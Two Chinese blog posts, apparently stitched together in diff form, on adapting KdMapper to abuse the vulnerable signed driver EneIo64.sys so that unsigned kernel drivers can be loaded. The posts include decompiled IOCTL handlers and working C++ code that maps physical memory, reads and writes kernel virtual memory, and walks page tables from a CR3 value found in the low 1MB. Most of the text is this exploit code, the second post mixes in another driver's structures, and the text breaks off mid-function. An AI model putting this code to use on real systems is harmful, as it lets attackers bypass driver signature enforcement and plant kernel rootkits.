@@ -1,0 +1,1527 @@
+dMapper是一个利用intel的驱动漏洞可以无痕的加载未经签名的驱动，本文是利用其它漏洞（参考《【转载】利用签名驱动漏洞加载未签名驱动》）做相应的修改以实现类似功能。需要大家对KdMapper的代码有一定了解。
+
+ 
+
+2.驱动信息
+ 
+
+驱动名称	EneIo64.sys 
+时间戳	5AB08710
+MD5	11FB599312CB1CF43CA5E879ED6FB71E
+ 
+
+3.IDA分析
+3.1 入口函数：
+NTSTATUS __stdcall DriverEntry(_DRIVER_OBJECT* DriverObject, PUNICODE_STRING RegistryPath)
+{
+        int v3; // ebx
+        struct _UNICODE_STRING DestinationString; // [rsp+40h] [rbp-28h] BYREF
+        struct _UNICODE_STRING SymbolicLinkName; // [rsp+50h] [rbp-18h] BYREF
+        PDEVICE_OBJECT DeviceObject; // [rsp+80h] [rbp+18h] BYREF
+        DeviceObject = 0i64;
+        DbgPrint("Entering DriverEntry", RegistryPath);
+        RtlInitUnicodeString(&DestinationString, L"\\Device\\EneIo");
+        v3 = IoCreateDevice(DriverObject, 0, &DestinationString, 0x8010u, 0, 0, &DeviceObject);
+        if (v3 < 0)
+        {
+                DbgPrint("ERROR: IoCreateDevice failed");
+        }
+        else
+        {
+                DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)sub_11100;
+                DriverObject->MajorFunction[2] = (PDRIVER_DISPATCH)sub_11100;
+                DriverObject->MajorFunction[0] = (PDRIVER_DISPATCH)sub_11100;
+                DriverObject->DriverUnload = (PDRIVER_UNLOAD)DriverUnload;
+                RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\EneIo");
+                v3 = IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
+                if (v3 < 0)
+                {
+                        DbgPrint("ERROR: IoCreateSymbolicLink failed");
+                        IoDeleteDevice(DeviceObject);
+                }
+        }
+        DbgPrint("Leaving DriverEntry");
+        return v3;
+}
+ 
+
+3.2 IRP_MJ_DEVICE_CONTROL
+IRP_MJ_DEVICE_CONTROL对应的函数 sub_11100，其代码如下：
+
+__int64 __fastcall sub_11100(_DEVICE_OBJECT* pDeviceObject, IRP* pIrp)
+{
+        _IO_STACK_LOCATION* pIosp; // rsi
+        MAP_PHYSICAL_MEMORY_INFO* pPhysicalMemoryInfo; // rbp
+        ......
+        pIosp = pIrp->Tail.Overlay.CurrentStackLocation;
+        pPhysicalMemoryInfo = (MAP_PHYSICAL_MEMORY_INFO*)pIrp->AssociatedIrp.SystemBuffer;
+        nInputBufferLength = pIosp->Parameters.DeviceIoControl.InputBufferLength;
+        switch (pIosp->MajorFunction)
+        {
+                ......
+        case 0xEu:
+                DbgPrint("IRP_MJ_DEVICE_CONTROL");
+                nIoControlCode = pIosp->Parameters.DeviceIoControl.IoControlCode;
+                switch (nIoControlCode)
+                {
+                case 0x80102040:
+                        DbgPrint("IOCTL_WINIO_MAPPHYSTOLIN");
+                        if (!(_DWORD)nInputBufferLength)
+                                goto LABEL_13;
+                        memmove(Src, pPhysicalMemoryInfo, nInputBufferLength);
+                        ntStatusV20 = sub_11528((PHYSICAL_ADDRESS)Src[1], Src[0], &BaseAddress, &Handle, &Object);
+                        if (ntStatusV20 >= 0)
+                        {
+                                memmove(pPhysicalMemoryInfo, Src, nInputBufferLength);
+                                pIrp->IoStatus.Information = nInputBufferLength;
+                        }
+                        pIrp->IoStatus.Status = ntStatusV20;
+                        break;
+                case 0x80102044:
+                        DbgPrint("IOCTL_WINIO_UNMAPPHYSADDR");
+                        if (!(_DWORD)nInputBufferLength)
+                                goto LABEL_13;
+                        memmove(Src, pPhysicalMemoryInfo, nInputBufferLength);
+                        pObjectV16 = Object;
+                        pMappedAddressV17 = BaseAddress;
+                        hSectionV18 = Handle;
+                        DbgPrint("Entering UnmapPhysicalMemory");
+                        ntStatusV19 = ZwUnmapViewOfSection((HANDLE)0xFFFFFFFFFFFFFFFFi64, pMappedAddressV17);
+                        if (ntStatusV19 < 0)
+                                DbgPrint("ERROR: UnmapViewOfSection failed");
+                        if (pObjectV16)
+                                ObfDereferenceObject(pObjectV16);
+                        ZwClose(hSectionV18);
+                        DbgPrint("Leaving UnmapPhysicalMemory");
+                        pIrp->IoStatus.Status = ntStatusV19;
+                        break;
+                ......
+                default:
+                        DbgPrint("ERROR: Unknown IRP_MJ_DEVICE_CONTROL");
+                LABEL_13:
+                        pIrp->IoStatus.Status = 0xC000000D;
+                        goto LABEL_50;
+                }
+                break;
+        }
+LABEL_50:
+        v21 = pIrp->IoStatus.Status;
+        IofCompleteRequest(pIrp, 0);
+        DbgPrint("Leaving WinIoDispatch");
+        return v21;
+}
+  其中映射物理内存 ControlCode 为 0x80102040，相应的函数为 sub_11528 , 取消映射为 0x80102044。
+
+ 
+
+3.3 映射物理内存
+sub_11528 如下：
+
+__int64 __fastcall sub_11528(PHYSICAL_ADDRESS BusAddress, ULONG_PTR nSize, PVOID* pMappedAddress, void** hSection, PVOID* pObject)
+{
+        PVOID* Object; // rbx
+        NTSTATUS ntStatus; // edi
+        BOOLEAN bMapStart; // al
+        BOOLEAN bMapStartOK; // bl
+        BOOLEAN bMapEnd; // al
+        PVOID BaseAddress; // [rsp+50h] [rbp-78h] BYREF
+        LARGE_INTEGER BusAddressa; // [rsp+58h] [rbp-70h] BYREF
+        LARGE_INTEGER TranslatedAddress; // [rsp+60h] [rbp-68h] BYREF
+        union _LARGE_INTEGER SectionOffset; // [rsp+68h] [rbp-60h] BYREF
+        struct _UNICODE_STRING DestinationString; // [rsp+70h] [rbp-58h] BYREF
+        struct _OBJECT_ATTRIBUTES ObjectAttributes; // [rsp+80h] [rbp-48h] BYREF
+        ULONG_PTR CommitSize; // [rsp+D8h] [rbp+10h] BYREF
+        ULONG AddressSpace; // [rsp+E8h] [rbp+20h] BYREF
+        CommitSize = nSize;
+        BaseAddress = 0i64;
+        DbgPrint("Entering MapPhysicalMemoryToLinearSpace");
+        RtlInitUnicodeString(&DestinationString, L"\\Device\\PhysicalMemory");
+        *hSection = 0i64;
+        Object = pObject;
+        *pObject = 0i64;
+        ObjectAttributes.RootDirectory = 0i64;
+        ObjectAttributes.SecurityDescriptor = 0i64;
+        ObjectAttributes.SecurityQualityOfService = 0i64;
+        ObjectAttributes.Length = 48;
+        ObjectAttributes.Attributes = 64;
+        ObjectAttributes.ObjectName = &DestinationString;
+        ntStatus = ZwOpenSection(hSection, 0xF001Fu, &ObjectAttributes);
+        if (ntStatus < 0)
+        {
+                DbgPrint("ERROR: ZwOpenSection failed");
+        }
+        else
+        {
+                ntStatus = ObReferenceObjectByHandle(*hSection, 0xF001Fu, 0i64, 0, Object, 0i64);
+                if (ntStatus < 0)
+                {
+                        DbgPrint("ERROR: ObReferenceObjectByHandle failed");
+                }
+                else
+                {
+                        AddressSpace = 0;
+                        TranslatedAddress = BusAddress;
+                        BusAddressa.QuadPart = BusAddress.QuadPart + CommitSize;
+                        bMapStart = HalTranslateBusAddress(Isa, 0, BusAddress, &AddressSpace, &TranslatedAddress);
+                        AddressSpace = 0;
+                        bMapStartOK = bMapStart;
+                        bMapEnd = HalTranslateBusAddress(Isa, 0, BusAddressa, &AddressSpace, &BusAddressa);
+                        if (bMapStartOK && bMapEnd)
+                        {
+                                SectionOffset = TranslatedAddress;
+                                CommitSize = BusAddressa.QuadPart - TranslatedAddress.QuadPart;
+                                ntStatus = ZwMapViewOfSection(
+                                        *hSection,
+                                        (HANDLE)0xFFFFFFFFFFFFFFFFi64,
+                                        &BaseAddress,
+                                        0i64,
+                                        BusAddressa.QuadPart - TranslatedAddress.QuadPart,
+                                        &SectionOffset,
+                                        &CommitSize,
+                                        ViewShare,
+                                        0,
+                                        0x204u);
+                                if (ntStatus == 0xC0000018)
+                                        ntStatus = ZwMapViewOfSection(
+                                                *hSection,
+                                                (HANDLE)0xFFFFFFFFFFFFFFFFi64,
+                                                &BaseAddress,
+                                                0i64,
+                                                CommitSize,
+                                                &SectionOffset,
+                                                &CommitSize,
+                                                ViewShare,
+                                                0,
+                                                4u);
+                                if (ntStatus >= 0)
+                                {
+                                        BaseAddress = (char*)BaseAddress + TranslatedAddress.QuadPart - SectionOffset.QuadPart;
+                                        *pMappedAddress = BaseAddress;
+                                }
+                                else
+                                {
+                                        DbgPrint("ERROR: ZwMapViewOfSection failed");
+                                }
+                        }
+                        else
+                        {
+                                DbgPrint("ERROR: HalTranslateBusAddress failed");
+                        }
+                }
+        }
+        if (ntStatus < 0)
+                ZwClose(*hSection);
+        DbgPrint("Leaving MapPhysicalMemoryToLinearSpace");
+        return (unsigned int)ntStatus;
+}
+  其使用的是ZwMapViewOfSection将物理内存映射到进程空间。由于使用了物理内存，在代码过程中会遇到物理页面和虚拟页面不一一对应的问题，问题说明及解决办法见《KdMapper扩展中遇到的相关问题》。
+
+ 
+
+3.4 MAP_PHYSICAL_MEMORY_INFO结构
+00000000 MAP_PHYSICAL_MEMORY_INFO struc ; (sizeof=0x28, align=0x8, copyof_380)
+00000000 Size            LARGE_INTEGER ?
+00000008 PhysicalAddress PHYSICAL_ADDRESS ?
+00000010 hSection        dq ?                    ; offset
+00000018 pMappedAddress  dq ?                    ; offset
+00000020 pObject         dq ?                    ; offset
+00000028 MAP_PHYSICAL_MEMORY_INFO ends
+ 
+
+4. 代码实现
+4.1 .h文件
+#pragma pack(push)
+#pragma pack(1)
+        typedef struct /*DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT)*/_ENEIO64_PHYSICAL_MEMORY_INFO {
+                LARGE_INTEGER Size;
+                PHYSICAL_ADDRESS PhysicalAddress;
+                PVOID hSection;
+                PVOID  pMappedAddress;
+                PVOID pObject;
+        } ENEIO64_PHYSICAL_MEMORY_INFO, * PENEIO64_PHYSICAL_MEMORY_INFO;
+#pragma pack(pop)
+#ifndef RtlOffsetToPointer
+#define RtlOffsetToPointer(Base, Offset)  ((PCHAR)( ((PCHAR)(Base)) + ((ULONG_PTR)(Offset))  ))
+#endif
+#ifndef RtlPointerToOffset
+#define RtlPointerToOffset(Base, Pointer)  ((ULONG)( ((PCHAR)(Pointer)) - ((PCHAR)(Base))  ))
+#endif
+#define ENEIO64_DEVICE_TYPE          (DWORD)0x8010
+#define ENEIO64_MAP_SECTION_FUNCID   (DWORD)0x810
+#define ENEIO64_UNMAP_SECTION_FUNCID (DWORD)0x811
+#define IOCTL_ENEIO64_MAP_USER_PHYSICAL_MEMORY      \
+    CTL_CODE(ENEIO64_DEVICE_TYPE, ENEIO64_MAP_SECTION_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80102040
+#define IOCTL_ENEIO64_UNMAP_USER_PHYSICAL_MEMORY    \
+    CTL_CODE(ENEIO64_DEVICE_TYPE, ENEIO64_UNMAP_SECTION_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80102044
+ 
+
+4.2 .c文件
+NTSTATUS asus_driver::SuperCallDriverEx(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG IoControlCode,
+        _In_ PVOID InputBuffer,
+        _In_ ULONG InputBufferLength,
+        _In_opt_ PVOID OutputBuffer,
+        _In_opt_ ULONG OutputBufferLength,
+        _Out_opt_ PIO_STATUS_BLOCK IoStatus)
+{
+        IO_STATUS_BLOCK ioStatus;
+        NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
+                NULL,
+                NULL,
+                NULL,
+                &ioStatus,
+                IoControlCode,
+                InputBuffer,
+                InputBufferLength,
+                OutputBuffer,
+                OutputBufferLength);
+        if (ntStatus == STATUS_PENDING) {
+                ntStatus = NtWaitForSingleObject(DeviceHandle,
+                        FALSE,
+                        NULL);
+        }
+        if (IoStatus)
+                *IoStatus = ioStatus;
+        return ntStatus;
+}
+BOOL asus_driver::SuperCallDriver(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG IoControlCode,
+        _In_ PVOID InputBuffer,
+        _In_ ULONG InputBufferLength,
+        _In_opt_ PVOID OutputBuffer,
+        _In_opt_ ULONG OutputBufferLength)
+{
+        BOOL bResult;
+        IO_STATUS_BLOCK ioStatus;
+        NTSTATUS ntStatus = SuperCallDriverEx(
+                DeviceHandle,
+                IoControlCode,
+                InputBuffer,
+                InputBufferLength,
+                OutputBuffer,
+                OutputBufferLength,
+                &ioStatus);
+        bResult = NT_SUCCESS(ntStatus);
+        SetLastError(RtlNtStatusToDosError(ntStatus));
+        return bResult;
+}
+PVOID asus_driver::SuperMapMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR PhysicalAddress,
+        _In_ ULONG NumberOfBytes,
+        PVOID* Object,
+        PHANDLE pHandle
+)
+{
+        ULONG_PTR offset;
+        ULONG mapSize;
+        ENEIO64_PHYSICAL_MEMORY_INFO request;
+        RtlSecureZeroMemory(&request, sizeof(request));
+        offset = PhysicalAddress & ~(PAGE_SIZE - 1);
+        mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;
+        request.PhysicalAddress.QuadPart = PhysicalAddress;
+        request.Size.QuadPart = mapSize;
+        request.pMappedAddress = NULL;
+        request.pObject = NULL;
+        request.hSection = NULL;
+        if (SuperCallDriver(DeviceHandle,
+                IOCTL_ENEIO64_MAP_USER_PHYSICAL_MEMORY,
+                &request,
+                sizeof(request),
+                &request,
+                sizeof(request)))
+        {
+                /*Log(L"[!] SuperMapMemory, Address:0x" << std::setbase(16) << request.MappedBaseAddress << std::endl);*/
+                if (Object)
+                {
+                        *Object = request.pObject;
+                }
+                if (pHandle)
+                {
+                        *pHandle = request.hSection;
+                }
+                return request.pMappedAddress;
+        }
+        return NULL;
+}
+VOID asus_driver::SuperUnmapMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ PVOID SectionToUnmap,
+        PVOID Object,
+        HANDLE Handle
+)
+{
+        ENEIO64_PHYSICAL_MEMORY_INFO request;
+        RtlSecureZeroMemory(&request, sizeof(request));
+        request.pMappedAddress = SectionToUnmap;
+        request.pObject = Object;
+        request.hSection = Handle;
+        SuperCallDriver(DeviceHandle,
+                IOCTL_ENEIO64_UNMAP_USER_PHYSICAL_MEMORY,
+                &request,
+                sizeof(request),
+                &request,
+                sizeof(request));
+}
+BOOL WINAPI asus_driver::SuperReadWritePhysicalMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR PhysicalAddress,
+        _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+        _In_ ULONG NumberOfBytes,
+        _In_ BOOLEAN DoWrite)
+{
+        BOOL bResult = FALSE;
+        DWORD dwError = ERROR_SUCCESS;
+        PVOID mappedSection = NULL;
+        ULONG_PTR offset;
+        PVOID Object = NULL;
+        HANDLE hSection = NULL;
+        //
+        // Map physical memory section.
+        //
+        mappedSection = SuperMapMemory(DeviceHandle,
+                PhysicalAddress,
+                NumberOfBytes,
+                &Object,
+                &hSection);
+        if (mappedSection) {
+                offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));
+                __try {
+                        if (DoWrite) {
+                                RtlCopyMemory(mappedSection/*RtlOffsetToPointer(mappedSection, offset)*/, Buffer, NumberOfBytes);
+                        }
+                        else {
+                                RtlCopyMemory(Buffer, mappedSection /*RtlOffsetToPointer(mappedSection, offset)*/, NumberOfBytes);
+                        }
+                        bResult = TRUE;
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                        bResult = FALSE;
+                        dwError = GetExceptionCode();
+                        Log(L"[!] Error AtszioReadWritePhysicalMemory Exception!" << std::endl);
+                }
+                //
+                // Unmap physical memory section.
+                //
+                SuperUnmapMemory(DeviceHandle,
+                        mappedSection,
+                        Object,
+                        hSection);
+        }
+        else {
+                dwError = GetLastError();
+        }
+        SetLastError(dwError);
+        return bResult;
+}
+BOOL WINAPI asus_driver::SuperReadPhysicalMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR PhysicalAddress,
+        _In_ PVOID Buffer,
+        _In_ ULONG NumberOfBytes)
+{
+        return SuperReadWritePhysicalMemory(DeviceHandle,
+                PhysicalAddress,
+                Buffer,
+                NumberOfBytes,
+                FALSE);
+}
+BOOL WINAPI asus_driver::SuperWritePhysicalMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR PhysicalAddress,
+        _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+        _In_ ULONG NumberOfBytes)
+{
+        return SuperReadWritePhysicalMemory(DeviceHandle,
+                PhysicalAddress,
+                Buffer,
+                NumberOfBytes,
+                TRUE);
+}
+BOOL WINAPI asus_driver::SuperWriteKernelVirtualMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR Address,
+        _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
+        _In_ ULONG NumberOfBytes)
+{
+        BOOL bResult;
+        ULONG_PTR physicalAddress = 0;
+        SetLastError(ERROR_SUCCESS);
+        bResult = SuperVirtualToPhysical(DeviceHandle,
+                Address,
+                &physicalAddress);
+        if (bResult) {
+                bResult = SuperReadWritePhysicalMemory(DeviceHandle,
+                        physicalAddress,
+                        Buffer,
+                        NumberOfBytes,
+                        TRUE);
+        }
+        return bResult;
+}
+BOOL WINAPI asus_driver::SuperReadKernelVirtualMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR Address,
+        _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
+        _In_ ULONG NumberOfBytes)
+{
+        BOOL bResult;
+        ULONG_PTR physicalAddress = 0;
+        SetLastError(ERROR_SUCCESS);
+        bResult = SuperVirtualToPhysical(DeviceHandle,
+                Address,
+                &physicalAddress);
+        if (bResult) {
+                bResult = SuperReadWritePhysicalMemory(DeviceHandle,
+                        physicalAddress,
+                        Buffer,
+                        NumberOfBytes,
+                        FALSE);
+        }
+        return bResult;
+}
+  其中 SuperReadKernelVirtualMemory 和 SuperWriteKernelVirtualMemory 读写虚拟地址内存页面中的 虚拟地址转物理地址函数 SuperVirtualToPhysical 的实现在《KdMapper扩展实现之虚拟地址转物理地址 》一文中有介绍。
+
+
+dMapper扩展实现之虚拟地址转物理地址
+发布时间 2023-09-04 10:51:42作者: 禁锢在时空之中的灵魂
+1.背景
+  KdMapper是一个利用intel的驱动漏洞可以无痕的加载未经签名的驱动，本文是利用其它漏洞（参考《【转载】利用签名驱动漏洞加载未签名驱动》）做相应的修改以实现类似功能时遇到的问题，需要大家对KdMapper的代码有一定了解。
+
+  在《【转载】利用签名驱动漏洞加载未签名驱动》中有很多利用MmMapIoSpace和ZwMapViewOfSection将物理内存映射后进行内存数据读写的情况，一般情况下需要先将虚拟地址转换为物理地址，内核中使用MmGetPhysicalAddress即可。但有发现大多数的漏洞驱动并没有MmGetPhysicalAddress的利用。这样以来就需要使用其它办法从虚拟地址转换为物理地址。
+
+  本文采用的方法取自另一款内核映射器开源项目 KDU,项目地址https://github.com/hfiref0x/KDU。
+
+ 
+
+2.关键代码
+  从虚拟地址转换为物理地址，直接上关键代码：
+
+  结构定义：
+
+#pragma pack(push,2)
+typedef struct _FAR_JMP_16 {
+        UCHAR  OpCode;  // = 0xe9
+        USHORT Offset;
+} FAR_JMP_16;
+typedef struct _FAR_TARGET_32 {
+        ULONG Offset;
+        USHORT Selector;
+} FAR_TARGET_32;
+typedef struct _PSEUDO_DESCRIPTOR_32 {
+        USHORT Limit;
+        ULONG Base;
+} PSEUDO_DESCRIPTOR_32;
+#pragma pack(pop)
+typedef union _KGDTENTRY64 {
+        struct {
+                USHORT  LimitLow;
+                USHORT  BaseLow;
+                union {
+                        struct {
+                                UCHAR   BaseMiddle;
+                                UCHAR   Flags1;
+                                UCHAR   Flags2;
+                                UCHAR   BaseHigh;
+                        } Bytes;
+                        struct {
+                                ULONG   BaseMiddle : 8;
+                                ULONG   Type : 5;
+                                ULONG   Dpl : 2;
+                                ULONG   Present : 1;
+                                ULONG   LimitHigh : 4;
+                                ULONG   System : 1;
+                                ULONG   LongMode : 1;
+                                ULONG   DefaultBig : 1;
+                                ULONG   Granularity : 1;
+                                ULONG   BaseHigh : 8;
+                        } Bits;
+                };
+                ULONG BaseUpper;
+                ULONG MustBeZero;
+        };
+        ULONG64 Alignment;
+} KGDTENTRY64, * PKGDTENTRY64;
+typedef union _KIDTENTRY64 {
+        struct {
+                USHORT OffsetLow;
+                USHORT Selector;
+                USHORT IstIndex : 3;
+                USHORT Reserved0 : 5;
+                USHORT Type : 5;
+                USHORT Dpl : 2;
+                USHORT Present : 1;
+                USHORT OffsetMiddle;
+                ULONG OffsetHigh;
+                ULONG Reserved1;
+        };
+        ULONG64 Alignment;
+} KIDTENTRY64, * PKIDTENTRY64;
+typedef union _KGDT_BASE {
+        struct {
+                USHORT BaseLow;
+                UCHAR BaseMiddle;
+                UCHAR BaseHigh;
+                ULONG BaseUpper;
+        };
+        ULONG64 Base;
+} KGDT_BASE, * PKGDT_BASE;
+typedef union _KGDT_LIMIT {
+        struct {
+                USHORT LimitLow;
+                USHORT LimitHigh : 4;
+                USHORT MustBeZero : 12;
+        };
+        ULONG Limit;
+} KGDT_LIMIT, * PKGDT_LIMIT;
+#define PSB_GDT32_MAX       3
+typedef struct _KDESCRIPTOR {
+        USHORT Pad[3];
+        USHORT Limit;
+        PVOID Base;
+} KDESCRIPTOR, * PKDESCRIPTOR;
+typedef struct _KDESCRIPTOR32 {
+        USHORT Pad[3];
+        USHORT Limit;
+        ULONG Base;
+} KDESCRIPTOR32, * PKDESCRIPTOR32;
+typedef struct _KSPECIAL_REGISTERS {
+        ULONG64 Cr0;
+        ULONG64 Cr2;
+        ULONG64 Cr3;
+        ULONG64 Cr4;
+        ULONG64 KernelDr0;
+        ULONG64 KernelDr1;
+        ULONG64 KernelDr2;
+        ULONG64 KernelDr3;
+        ULONG64 KernelDr6;
+        ULONG64 KernelDr7;
+        KDESCRIPTOR Gdtr;
+        KDESCRIPTOR Idtr;
+        USHORT Tr;
+        USHORT Ldtr;
+        ULONG MxCsr;
+        ULONG64 DebugControl;
+        ULONG64 LastBranchToRip;
+        ULONG64 LastBranchFromRip;
+        ULONG64 LastExceptionToRip;
+        ULONG64 LastExceptionFromRip;
+        ULONG64 Cr8;
+        ULONG64 MsrGsBase;
+        ULONG64 MsrGsSwap;
+        ULONG64 MsrStar;
+        ULONG64 MsrLStar;
+        ULONG64 MsrCStar;
+        ULONG64 MsrSyscallMask;
+} KSPECIAL_REGISTERS, * PKSPECIAL_REGISTERS;
+typedef struct _KPROCESSOR_STATE {
+        KSPECIAL_REGISTERS SpecialRegisters;
+        CONTEXT ContextFrame;
+} KPROCESSOR_STATE, * PKPROCESSOR_STATE;
+typedef struct _PROCESSOR_START_BLOCK* PPROCESSOR_START_BLOCK;
+typedef struct _PROCESSOR_START_BLOCK {
+        FAR_JMP_16 Jmp;
+        ULONG CompletionFlag;
+        PSEUDO_DESCRIPTOR_32 Gdt32;
+        PSEUDO_DESCRIPTOR_32 Idt32;
+        KGDTENTRY64 Gdt[PSB_GDT32_MAX + 1];
+        ULONG64 TiledCr3;
+        FAR_TARGET_32 PmTarget;
+        FAR_TARGET_32 LmIdentityTarget;
+        PVOID LmTarget;
+        PPROCESSOR_START_BLOCK SelfMap;
+        ULONG64 MsrPat;
+        ULONG64 MsrEFER;
+        KPROCESSOR_STATE ProcessorState;
+} PROCESSOR_START_BLOCK;
+#ifndef FIELD_OFFSET
+#define FIELD_OFFSET(type, field)    ((LONG)(LONG_PTR)&(((type *)0)->field))
+#define UFIELD_OFFSET(type, field)    ((ULONG)(LONG_PTR)&(((type *)0)->field))
+#endif
+int asus_driver::PwEntryToPhyAddr(ULONG_PTR entry, ULONG_PTR* phyaddr)
+{
+        if (entry & ENTRY_PRESENT_BIT) {
+                *phyaddr = entry & PHY_ADDRESS_MASK;
+                return 1;
+        }
+        return 0;
+}
+ULONG_PTR asus_driver::SuperGetPML4FromLowStub1M(
+        _In_ ULONG_PTR pbLowStub1M)
+{
+        ULONG offset = 0;
+        ULONG_PTR PML4 = 0;
+        ULONG cr3_offset = FIELD_OFFSET(PROCESSOR_START_BLOCK, ProcessorState) +
+                FIELD_OFFSET(KSPECIAL_REGISTERS, Cr3);
+        SetLastError(ERROR_EXCEPTION_IN_SERVICE);
+        __try {
+                while (offset < 0x100000) {
+                        offset += 0x1000;
+                        if (0x00000001000600E9 != (0xffffffffffff00ff & *(UINT64*)(pbLowStub1M + offset))) //PROCESSOR_START_BLOCK->Jmp
+                                continue;
+                        if (0xfffff80000000000 != (0xfffff80000000003 & *(UINT64*)(pbLowStub1M + offset + FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget))))
+                                continue;
+                        if (0xffffff0000000fff & *(UINT64*)(pbLowStub1M + offset + cr3_offset))
+                                continue;
+                        PML4 = *(UINT64*)(pbLowStub1M + offset + cr3_offset);
+                        break;
+                }
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+                Log(L"[!] Error SuperGetPML4FromLowStub1M Exception!" << std::endl);
+                return 0;
+        }
+        SetLastError(ERROR_SUCCESS);
+        return PML4;
+}
+PVOID asus_driver::SuperMapMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR PhysicalAddress,
+        _In_ ULONG NumberOfBytes
+)
+{
+        ULONG_PTR offset;
+        ULONG mapSize;
+        ASMMAP64_PHYSICAL_MEMORY_INFO request;
+        RtlSecureZeroMemory(&request, sizeof(request));
+        offset = PhysicalAddress & ~(PAGE_SIZE - 1);
+        mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;
+        request.PhysicalAddress.QuadPart = PhysicalAddress;
+        request.MappedLengthOut = mapSize; 
+        request.MappedLengthIn = mapSize;
+        request.MappedBaseAddress = NULL;
+        if (SuperCallDriver(DeviceHandle,
+                IOCTL_ASMMAP64_MAP_USER_PHYSICAL_MEMORY,
+                &request,
+                sizeof(request),
+                &request,
+                sizeof(request)))
+        {
+                /*Log(L"[!] SuperMapMemory, Address:0x" << std::setbase(16) << request.MappedBaseAddress << std::endl);*/
+                return request.MappedBaseAddress;
+        }
+        return NULL;
+}
+VOID asus_driver::SuperUnmapMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ PVOID SectionToUnmap
+)
+{
+        ASMMAP64_PHYSICAL_MEMORY_INFO request;
+        RtlSecureZeroMemory(&request, sizeof(request));
+        request.MappedBaseAddress = SectionToUnmap;
+        SuperCallDriver(DeviceHandle,
+                IOCTL_ASMMAP64_UNMAP_USER_PHYSICAL_MEMORY,
+                &request,
+                sizeof(request),
+                &request,
+                sizeof(request));
+}
+BOOL WINAPI asus_driver::SuperQueryPML4Value(
+        _In_ HANDLE DeviceHandle,
+        _Out_ ULONG_PTR* Value)
+{
+        ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
+        DWORD cbRead = 0x100000;
+        *Value = 0;
+        SetLastError(ERROR_SUCCESS);
+        pbLowStub1M = (ULONG_PTR)SuperMapMemory(DeviceHandle,
+                0ULL,
+                cbRead);
+        if (pbLowStub1M) {
+                PML4 = SuperGetPML4FromLowStub1M(pbLowStub1M);
+                if (PML4)
+                        *Value = PML4;
+                SuperUnmapMemory(DeviceHandle,
+                        (PVOID)pbLowStub1M);
+        }
+        return (PML4 != 0);
+}
+BOOL asus_driver::PwVirtualToPhysical(
+        _In_ HANDLE DeviceHandle,
+        _In_ ProvQueryPML4 QueryPML4Routine,
+        _In_ ProvReadPhysicalMemory ReadPhysicalMemoryRoutine,
+        _In_ ULONG_PTR VirtualAddress,
+        _Out_ ULONG_PTR* PhysicalAddress)
+{
+        ULONG_PTR   pml4_cr3, selector, table, entry = 0;
+        INT         r, shift;
+        *PhysicalAddress = 0;
+        if (QueryPML4Routine(DeviceHandle, &pml4_cr3) == 0) {
+                SetLastError(ERROR_DEVICE_HARDWARE_ERROR);
+                return 0;
+        }
+        table = pml4_cr3 & PHY_ADDRESS_MASK;
+        for (r = 0; r < 4; r++) {
+                shift = 39 - (r * 9);
+                selector = (VirtualAddress >> shift) & 0x1ff;
+                if (ReadPhysicalMemoryRoutine(DeviceHandle,
+                        table + selector * 8,
+                        &entry,
+                        sizeof(ULONG_PTR)) == 0)
+                {
+                        //
+                        // Last error set by called routine.
+                        //
+                        return 0;
+                }
+                if (PwEntryToPhyAddr(entry, &table) == 0) {
+                        SetLastError(ERROR_INVALID_ADDRESS);
+                        return 0;
+                }
+                if (entry & ENTRY_PAGE_SIZE_BIT)
+                {
+                        if (r == 1) {
+                                table &= PHY_ADDRESS_MASK_1GB_PAGES;
+                                table += VirtualAddress & VADDR_ADDRESS_MASK_1GB_PAGES;
+                                *PhysicalAddress = table;
+                                return 1;
+                        }
+                        if (r == 2) {
+                                table &= PHY_ADDRESS_MASK_2MB_PAGES;
+                                table += VirtualAddress & VADDR_ADDRESS_MASK_2MB_PAGES;
+                                *PhysicalAddress = table;
+                                return 1;
+                        }
+                }
+        }
+        table += VirtualAddress & VADDR_ADDRESS_MASK_4KB_PAGES;
+        *PhysicalAddress = table;
+        return 1;
+}
+BOOL WINAPI asus_driver::SuperVirtualToPhysical(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR VirtualAddress,
+        _Out_ ULONG_PTR* PhysicalAddress)
+{
+        return PwVirtualToPhysical(DeviceHandle,
+                SuperQueryPML4Value,
+                SuperReadPhysicalMemory,
+                VirtualAddress,
+                PhysicalAddress);
+}
+BOOL WINAPI asus_driver::SuperReadWritePhysicalMemory(
+        _In_ HANDLE DeviceHandle,
+        _In_ ULONG_PTR PhysicalAddress,
+        _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+        _In_ ULONG NumberOfBytes,
+        _In_ BOOLEAN DoWrite)
+{
+        BOOL bResult = FALSE;
+        DWORD dwError = ERROR_SUCCESS;
+        PVOID mappedSection = NULL;
+        ULONG_PTR offset;
+        //
